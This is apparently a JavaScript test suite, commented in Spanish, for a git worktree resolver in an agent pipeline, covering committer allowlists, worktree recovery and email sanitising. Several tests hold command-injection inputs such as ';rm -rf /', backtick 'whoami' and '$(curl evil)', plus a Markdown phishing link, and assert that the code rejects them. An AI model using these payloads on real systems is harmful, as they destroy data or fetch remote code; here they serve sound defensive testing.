    assert.equal(result.branchOriginVerified, true);
    assert.match(result.worktreePath, /platform\.agent-2505-custom$/);
});

// ---- Adversariales: command injection ---------------------------------------

test('resolveExistingWorktree — issue con `;rm -rf /` es rechazado sin spawn', () => {
    let called = false;
    const spawnImpl = () => { called = true; return { status: 0, stdout: '', stderr: '', error: null }; };
    assert.throws(
        () => resolveExistingWorktree({
            ROOT: '/repo', issue: '2505;rm -rf /', skill: 'delivery',
            spawnImpl, fsImpl: fakeFs(false),
        }),
        (e) => e.code === 'INVALID_ISSUE',
    );
    assert.equal(called, false, 'No debe ejecutar git ante input adversarial');
});

test('resolveExistingWorktree — skill con backticks es rechazado sin spawn', () => {
    let called = false;
    const spawnImpl = () => { called = true; return { status: 0, stdout: '', stderr: '', error: null }; };
    assert.throws(
        () => resolveExistingWorktree({
            ROOT: '/repo', issue: 2505, skill: 'delivery`whoami`',
            spawnImpl, fsImpl: fakeFs(false),
        }),
        (e) => e.code === 'INVALID_SKILL',
    );
    assert.equal(called, false);
});

test('resolveExistingWorktree — skill con $() es rechazado sin spawn', () => {
    let called = false;
    const spawnImpl = () => { called = true; return { status: 0, stdout: '', stderr: '', error: null }; };
    assert.throws(
        () => resolveExistingWorktree({
            ROOT: '/repo', issue: 2505, skill: 'delivery$(curl evil)',
            spawnImpl, fsImpl: fakeFs(false),
        }),
        (e) => e.code === 'INVALID_SKILL',
    );
    assert.equal(called, false);
});

test('resolveExistingWorktree — issue como string no numérica rechazado', () => {
    assert.throws(
        () => resolveExistingWorktree({
            ROOT: '/repo', issue: 'abc', skill: 'delivery',
            spawnImpl: () => ({ status: 0, stdout: '', stderr: '', error: null }),
            fsImpl: fakeFs(false),
        }),
        (e) => e.code === 'INVALID_ISSUE',
    );
});

// ---- Worktree con espacios y caracteres especiales --------------------------

test('parseWorktreeList — soporta paths con espacios', () => {
    const input = [
        'worktree /tmp/path with spaces/platform.agent-2505-delivery',
        'HEAD aaa',
        'branch refs/heads/agent/2505-delivery',
        '',
    ].join('\n');
    const parsed = parseWorktreeList(input);
    assert.equal(parsed[0].worktree, '/tmp/path with spaces/platform.agent-2505-delivery');
});

// ---- Sanity de allowlist ----------------------------------------------------

test('PIPELINE_COMMITTER_ALLOWLIST contiene noreply@anthropic.com', () => {
    assert.ok(PIPELINE_COMMITTER_ALLOWLIST.has('noreply@anthropic.com'));
});

test('resolveDevBranch — propaga committers configurados a la verificación', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote --heads origin', stdout: 'abc\trefs/heads/agent/2505-custom\n' },
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'custom-agent@intrale\n' },
    ]);
    const result = resolveDevBranch('/repo', 2505, {
        spawnImpl,
        config: { worktree_provenance: { committers: ['custom-agent@intrale'] } },
    });
    assert.equal(result.ok, true);
    assert.equal(result.branch, 'agent/2505-custom');
});

test('loadCommitterAllowlist suma config sin pisar defaults y normaliza', () => {
    const resolved = loadCommitterAllowlist({
        config: { worktree_provenance: { committers: ['  CUSTOM@Intrale.Com  ', '', null] } },
    });
    assert.ok(resolved.has('noreply@anthropic.com'));
    assert.ok(resolved.has('custom@intrale.com'));
    assert.equal(resolved.has(''), false);
});

test('loadCommitterAllowlist funciona sin config ni sección', () => {
    assert.ok(loadCommitterAllowlist().has('backend-dev-agent@intrale'));
    assert.ok(loadCommitterAllowlist({ config: {} }).has('bot@intrale.com'));
});

// =============================================================================
// #5421 — D1 (recuperación en path fresco `-r<N>`, sin adoptar el huérfano) +
// propagación de `unverifiedAuthors` hasta el borde (CA-8 depende de esto).
// =============================================================================

const { extractUnverifiedAuthors, MAX_RECOVERY_SUFFIX } = require('../worktree-resolver');

/**
 * Fake spawn para los casos de recovery: registra los `worktree add` para poder
 * afirmar SOBRE QUÉ PATH se creó el worktree (no alcanza con el retorno).
 */
function makeRecoverySpawn(addCalls, { branch = 'agent/2505-delivery', author = 'noreply@anthropic.com' } = {}) {
    return function fakeSpawn(cmd, args) {
        const joined = `${cmd} ${args.join(' ')}`;
        if (joined.includes('worktree add')) {
            addCalls.push(args);
            return { error: null, status: 0, stdout: '', stderr: '' };
        }
        if (joined.includes('ls-remote')) {
            return { error: null, status: 0, stdout: `abc\trefs/heads/${branch}\n`, stderr: '' };
        }
        if (joined.includes('log --reverse --format=%ae')) {
            return { error: null, status: 0, stdout: `${author}\n`, stderr: '' };
        }
        return { error: null, status: 0, stdout: '', stderr: '' };
    };
}

const norm = (p) => String(p).replace(/\\/g, '/');

test('#5421 extractUnverifiedAuthors — extrae el email de author-not-allowlisted', () => {
    assert.deepEqual(
        extractUnverifiedAuthors(['author-not-allowlisted:android-dev-agent@intrale']),
        ['android-dev-agent@intrale'],
    );
});

test('#5421 extractUnverifiedAuthors — `no-commits-on-branch-or-fetch-empty` no aporta email', () => {
    assert.deepEqual(extractUnverifiedAuthors(['no-commits-on-branch-or-fetch-empty']), []);
    assert.deepEqual(extractUnverifiedAuthors(['log-author-failed: boom']), []);
    assert.deepEqual(extractUnverifiedAuthors([]), []);
    assert.deepEqual(extractUnverifiedAuthors(null), []);
});

test('#5421 extractUnverifiedAuthors — deduplica preservando el orden', () => {
    assert.deepEqual(
        extractUnverifiedAuthors([
            'author-not-allowlisted:a@intrale',
            'author-not-allowlisted:b@intrale',
            'author-not-allowlisted:a@intrale',
        ]),
        ['a@intrale', 'b@intrale'],
    );
});

test('#5421 resolveDevBranch — rama con committer fuera de allowlist propaga el email', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote --heads origin', stdout: 'abc\trefs/heads/agent/1123-fix\n' },
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'intruso@ejemplo.com\n' },
    ]);
    const result = resolveDevBranch('/repo', 1123, { spawnImpl });
    assert.equal(result.ok, false);
    assert.equal(result.branchOriginVerified, false);
    assert.deepEqual(result.unverifiedAuthors, ['intruso@ejemplo.com']);
    assert.deepEqual(result.verificationReasons, ['author-not-allowlisted:intruso@ejemplo.com']);
});

test('#5421 resolveDevBranch — rama sin commits NO produce email (habilita el wording de procedencia)', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git ls-remote --heads origin', stdout: 'abc\trefs/heads/agent/1123-fix\n' },
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: '' },
    ]);
    const result = resolveDevBranch('/repo', 1123, { spawnImpl });
    assert.equal(result.ok, false);
    assert.equal(result.branchOriginVerified, false);
    assert.deepEqual(result.unverifiedAuthors, []);
});

test('#5421 resolveExistingWorktree — `unverifiedAuthors` llega hasta el borde (found:false)', () => {
    const spawnImpl = makeFakeSpawn([
        { match: 'git worktree list --porcelain', stdout: '' },
        { match: 'git ls-remote --heads origin', stdout: 'abc\trefs/heads/agent/1123-fix\n' },
        { match: 'git fetch', stdout: '' },
        { match: 'git log --reverse --format=%ae', stdout: 'intruso@ejemplo.com\n' },
    ]);
    const result = resolveExistingWorktree({
        ROOT: '/repo', issue: 1123, skill: 'po', spawnImpl, fsImpl: fakeFs(false),
    });
    assert.equal(result.found, false);
    assert.equal(result.branchOriginVerified, false);
    assert.deepEqual(result.unverifiedAuthors, ['intruso@ejemplo.com']);
});

test('#5421 D1 — path colisionado + procedencia verificada da worktree fresco en -r2', () => {
    const addCalls = [];
    const spawnImpl = makeRecoverySpawn(addCalls);
    // Sólo el path base está ocupado; los sufijos están libres.
    const fsImpl = fakeFs((p) => norm(p).endsWith('platform.agent-2505-delivery'));

    const result = attemptAutoRecovery('/repo', '2505', 'delivery', { spawnImpl, fsImpl });

    assert.equal(result.ok, true);
    assert.match(norm(result.worktreePath), /platform\.agent-2505-delivery-r2$/);
    // S-1 / D2 — el resultado NUNCA apunta al directorio preexistente.
    assert.equal(norm(result.worktreePath).endsWith('platform.agent-2505-delivery'), false);
    assert.equal(norm(result.orphanPath).endsWith('platform.agent-2505-delivery'), true);
    // El `worktree add` se hizo sobre el path nuevo, no sobre el huérfano.
    assert.equal(addCalls.length, 1);
    assert.match(norm(addCalls[0][2]), /platform\.agent-2505-delivery-r2$/);
    // Y sale desde el remoto verificado, no desde el contenido local no verificado.
    assert.equal(addCalls[0].includes('origin/agent/2505-delivery'), true);
});

test('#5421 D1 — con -r2 ocupado usa el primer sufijo libre (-r3)', () => {
    const addCalls = [];
    const spawnImpl = makeRecoverySpawn(addCalls);
    const fsImpl = fakeFs((p) => {
        const n = norm(p);
        return n.endsWith('platform.agent-2505-delivery') || n.endsWith('platform.agent-2505-delivery-r2');
    });

    const result = attemptAutoRecovery('/repo', '2505', 'delivery', { spawnImpl, fsImpl });
    assert.equal(result.ok, true);
    assert.match(norm(result.worktreePath), /platform\.agent-2505-delivery-r3$/);
});

test('#5421 D1 — sin sufijo libre se conserva el reason historico y NO se toca el huerfano', () => {
    const addCalls = [];
    const spawnImpl = makeRecoverySpawn(addCalls);
    // TODO ocupado (path base + todos los sufijos).
    const result = attemptAutoRecovery('/repo', '2505', 'delivery', { spawnImpl, fsImpl: fakeFs(true) });

    assert.equal(result.ok, false);
    assert.match(result.reason, /^worktree-path-exists-without-git-entry:/);
    assert.equal(result.branchOriginVerified, true);
    assert.equal(addCalls.length, 0, 'sin path libre no se intenta ningun worktree add');
    assert.equal(MAX_RECOVERY_SUFFIX >= 2, true);
});

test('#5421 D1 — un existsSync que rompe se trata como ocupado (nunca escribimos a ciegas)', () => {
    const addCalls = [];
    const spawnImpl = makeRecoverySpawn(addCalls);
    const fsImpl = {
        existsSync: (p) => {
            if (norm(p).endsWith('platform.agent-2505-delivery')) return true;
            throw new Error('EACCES');
        },
    };
    const result = attemptAutoRecovery('/repo', '2505', 'delivery', { spawnImpl, fsImpl });
    assert.equal(result.ok, false);
    assert.match(result.reason, /^worktree-path-exists-without-git-entry:/);
    assert.equal(addCalls.length, 0);
});

test('#5421 D1 — path base libre: se sigue usando el path sin sufijo (sin regresion)', () => {
    const addCalls = [];
    const spawnImpl = makeRecoverySpawn(addCalls);
    const result = attemptAutoRecovery('/repo', '2505', 'delivery', { spawnImpl, fsImpl: fakeFs(false) });
    assert.equal(result.ok, true);
    assert.match(norm(result.worktreePath), /platform\.agent-2505-delivery$/);
    assert.equal(result.orphanPath, null);
});

test('#5421 D1 — findIssueWorktree resuelve un worktree con path `-r2`', () => {
    const spawnImpl = makeFakeSpawn([
        {
            match: 'git worktree list --porcelain',
            stdout: [
                'worktree /tmp/platform.agent-2505-delivery-r2',
                'HEAD bbb',
                'branch refs/heads/agent/2505-delivery',
                '',
            ].join('\n'),
        },
    ]);
    const found = findIssueWorktree('/repo', 2505, { skill: 'delivery', spawnImpl, fsImpl: fakeFs(true) });
    assert.ok(found, 'el worktree con sufijo -r2 debe seguir siendo resoluble');
    assert.match(found.worktree, /platform\.agent-2505-delivery-r2$/);
});

// =============================================================================
// #5421 CA-11 — saneamiento en el ORIGEN de los emails que llegan al operador.
//
// El email sale de `git log --format` sobre una rama REMOTA arbitraria: es
// input no confiable que termina interpolado en un mensaje Markdown de
// Telegram. `extractUnverifiedAuthors` sólo debe devolver strings con forma
// segura de email y descartar el resto (default cerrado).
//
// Ojo con la trampa que detectó `guru`: el charset NO puede ser el "clásico"
// sin corchetes, porque descartaría emails de bots de GitHub que son legítimos
// y están en la propia allowlist del pipeline. Descartarlos dejaría
// `unverifiedAuthors` vacío y el texto caería al wording de "posible rama
// ajena" — o sea, se arreglaría la inyección rompiendo CA-8.
// =============================================================================

const { MAX_EMAIL_LENGTH } = require('../worktree-resolver');

test('#5421 CA-11 — descarta el email de PHISHING con link Markdown embebido', () => {
    assert.deepEqual(
        extractUnverifiedAuthors([
            'author-not-allowlisted:a`[Actualizar credenciales](https://evil.tld/phish)`b@x.io',
        ]),
        [],
    );
});

test('#5421 CA-11 — descarta el email SILENCIADOR con backtick suelto', () => {
    assert.deepEqual(extractUnverifiedAuthors(['author-not-allowlisted:a`b@x.io']), []);
});

test('#5421 CA-11 — descarta payloads sin forma de email (espacios, saltos, sin arroba)', () => {
    assert.deepEqual(extractUnverifiedAuthors(['author-not-allowlisted:no-tiene-arroba']), []);
    assert.deepEqual(extractUnverifiedAuthors(['author-not-allowlisted:hola mundo@x.io']), []);
    assert.deepEqual(extractUnverifiedAuthors(['author-not-allowlisted:a@x.io\nb@y.io']), []);
    assert.deepEqual(extractUnverifiedAuthors(['author-not-allowlisted:*bold*@x.io']), []);
});

test('#5421 CA-11 — descarta por tope de longitud (RFC 5321: 254)', () => {
    const largo = `${'a'.repeat(70)}@${'b'.repeat(200)}.io`;
    assert.ok(largo.length > MAX_EMAIL_LENGTH, 'el fixture debe superar el tope');
    assert.deepEqual(extractUnverifiedAuthors([`author-not-allowlisted:${largo}`]), []);
});

test('#5421 CA-11 — ACEPTA el bot de GitHub con corchetes (anti-regresión de CA-8)', () => {
    // Está hardcodeado en PIPELINE_COMMITTER_ALLOWLIST: es forma legítima.
    const bot = '41898282+github-actions[bot]@users.noreply.github.com';
    assert.deepEqual(extractUnverifiedAuthors([`author-not-allowlisted:${bot}`]), [bot]);
});

test('#5421 CA-11 — ACEPTA los emails legítimos que ya usaba el pipeline', () => {
    for (const email of [
        'backend-dev-agent@intrale',
        'noreply@anthropic.com',
        'android-dev-agent@intrale',
        'un_agente@sub.dominio.com',
        "o'brien@intrale.com",
    ]) {
        assert.deepEqual(
            extractUnverifiedAuthors([`author-not-allowlisted:${email}`]),
            [email],
            `debería aceptar ${email}`,
        );
    }
});

test('#5421 CA-11 — un email hostil no arrastra a los legítimos de la misma tanda', () => {
    assert.deepEqual(
        extractUnverifiedAuthors([
            'author-not-allowlisted:a`b@x.io',
            'author-not-allowlisted:backend-dev-agent@intrale',
            'no-commits-on-branch-or-fetch-empty',
        ]),
        ['backend-dev-agent@intrale'],
    );
});
